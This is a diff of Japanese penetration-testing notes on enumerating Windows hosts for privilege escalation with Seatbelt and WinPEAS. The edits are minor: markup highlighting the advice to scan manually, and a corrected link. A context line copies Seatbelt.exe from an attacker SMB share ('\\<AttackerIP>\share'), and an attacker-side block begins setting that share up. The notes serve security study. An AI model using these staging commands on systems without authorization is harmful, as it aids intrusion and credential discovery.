@@ -21,7 +21,7 @@
 
 自動列挙ツールは過剰検知が多いため、他自動列挙ツールと併用する。
 理由は、複数のツールでスキャンすることで、異なる結果や見逃しに気付くことができるから。
-また、必ず手動でのスキャンを実施する。
+また、必ず==手動でのスキャンを実施==する。
 
 [Seatbelt](https://github.com/GhostPack/Seatbelt)
 ```zsh
@@ -41,7 +41,7 @@ cp \\<AttackerIP>\share\Seatbelt.exe .
 	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
 	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査
 
-[[WinPEAS]
+[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
 ```zsh
 # Attacker
 mkdir share
